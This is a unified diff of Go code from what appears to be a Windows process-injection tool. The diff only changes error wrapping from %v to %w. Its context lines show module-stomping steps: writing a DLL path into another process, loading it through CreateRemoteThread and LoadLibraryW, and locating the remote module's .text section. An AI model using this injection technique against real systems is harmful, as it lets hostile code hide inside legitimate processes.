@@ -187,11 +187,11 @@ func stompLoadRemoteDLL(hProcess uintptr, pid uint32, dllName string, sb *string
 	// Allocate memory for DLL path in remote process
 	pathAddr, err := injectAllocMemory(hProcess, len(dllPathBytes), PAGE_READWRITE)
 	if err != nil {
-		return 0, fmt.Errorf("allocate path memory: %v", err)
+		return 0, fmt.Errorf("allocate path memory: %w", err)
 	}
 	_, err = injectWriteMemory(hProcess, pathAddr, dllPathBytes)
 	if err != nil {
-		return 0, fmt.Errorf("write path: %v", err)
+		return 0, fmt.Errorf("write path: %w", err)
 	}
 
 	// Get LoadLibraryW address (kernel32 is loaded at same base in all processes)
@@ -210,7 +210,7 @@ func stompLoadRemoteDLL(hProcess uintptr, pid uint32, dllName string, sb *string
 		hThread, _, err = procCreateRemoteThread.Call(hProcess, 0, 0, loadLibAddr, pathAddr, 0,
 			uintptr(unsafe.Pointer(&tid)))
 		if hThread == 0 {
-			return 0, fmt.Errorf("CreateRemoteThread(LoadLibraryW) failed: %v", err)
+			return 0, fmt.Errorf("CreateRemoteThread(LoadLibraryW) failed: %w", err)
 		}
 	}
 
@@ -231,7 +231,7 @@ func stompLoadRemoteDLL(hProcess uintptr, pid uint32, dllName string, sb *string
 func stompFindModule(pid uint32, dllName string) (uintptr, error) {
 	snap, err := windows.CreateToolhelp32Snapshot(thSnapModule|thSnapModule32, pid)
 	if err != nil {
-		return 0, fmt.Errorf("CreateToolhelp32Snapshot: %v", err)
+		return 0, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
 	}
 	defer windows.CloseHandle(snap)
 
@@ -240,7 +240,7 @@ func stompFindModule(pid uint32, dllName string) (uintptr, error) {
 
 	ret, _, callErr := procModule32FirstW.Call(uintptr(snap), uintptr(unsafe.Pointer(&me)))
 	if ret == 0 {
-		return 0, fmt.Errorf("Module32FirstW: %v", callErr)
+		return 0, fmt.Errorf("Module32FirstW: %w", callErr)
 	}
 
 	target := strings.ToLower(dllName)
@@ -266,7 +266,7 @@ func stompFindRemoteTextSection(hProcess, baseAddr uintptr) (uint32, uint32, err
 	err := injectReadMemoryInto(hProcess, baseAddr,
 		unsafe.Pointer(&dosHeader), int(unsafe.Sizeof(dosHeader)))
 	if err != nil {
-		return 0, 0, fmt.Errorf("read DOS header: %v", err)
+		return 0, 0, fmt.Errorf("read DOS header: %w", err)
 	}
 	if dosHeader.EMagic != 0x5A4D {
 		return 0, 0, fmt.Errorf("invalid DOS magic: 0x%X", dosHeader.EMagic)
@@ -278,7 +278,7 @@ func stompFindRemoteTextSection(hProcess, baseAddr uintptr) (uint32, uint32, err
 	err = injectReadMemoryInto(hProcess, ntHeaderAddr,
 		unsafe.Pointer(&peSig), 4)
 	if err != nil {
-		return 0, 0, fmt.Errorf("read PE signature: %v", err)
+		return 0, 0, fmt.Errorf("read PE signature: %w", err)
 	}
 	if peSig != 0x00004550 {
 		return 0, 0, fmt.Errorf("invalid PE signature: 0x%X", peSig)
@@ -289,7 +289,7 @@ func stompFindRemoteTextSection(hProcess, baseAddr uintptr) (uint32, uint32, err
 	err = injectReadMemoryInto(hProcess, ntHeaderAddr+4,
 		unsafe.Pointer(&fileHeader), int(unsafe.Sizeof(fileHeader)))
 	if err != nil {
-		return 0, 0, fmt.Errorf("read file header: %v", err)
+		return 0, 0, fmt.Errorf("read file header: %w", err)
 	}
 
 	// Walk section headers to find .text
